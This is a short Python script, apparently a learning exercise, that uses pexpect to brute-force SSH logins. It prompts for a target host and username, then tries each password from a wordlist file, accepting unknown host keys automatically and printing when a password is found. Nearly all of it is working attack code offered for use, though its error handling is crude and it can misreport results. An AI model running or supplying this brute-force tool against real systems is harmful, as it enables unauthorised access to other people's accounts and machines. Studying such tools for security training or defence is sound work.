#!/usr/bin/python

# to syntax check run
# python -m py_compile <filename>

# may need to install this
# yourself in the python package manager
import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    conStr = 'ssh ' + user + '@' + host
    # connect to machine using pexpect.spawn and connection string
    child = pexpect.spawn(conStr)
    # what we expect to comeback from the spawn
    # Timeout, the string ssh_newkey or password either with capital P or p
    # child.expect returns 0 or 1
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        # Error if anything other than ssh_newkey or password
        print("[-] Error Connecting")
        return
    if ret == 1:
        # Send yes when the ssh_key comes up
        child.sendline('yes')
        # we then expect the password prompt
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print("[-] Error Connecting")
            return
    child.sendline(password)
    # expect this global list of various PROMPTs
    child.expect(PROMPT, timeout=0.5)
    return child

def main():
    host = input("Please input the host you want to brute force: ")
    user = input("Please input the user you want to brute force: ")
    #password = raw_input("Please input the password: ")
    file = open("passwords.txt", 'r')
    for passwd in file.readlines():
        try:
            child = connect(user, host, passwd)
            print("Password found: " + passwd)
        except:
            print("Password not found")


if __name__ == '__main__':
    main()

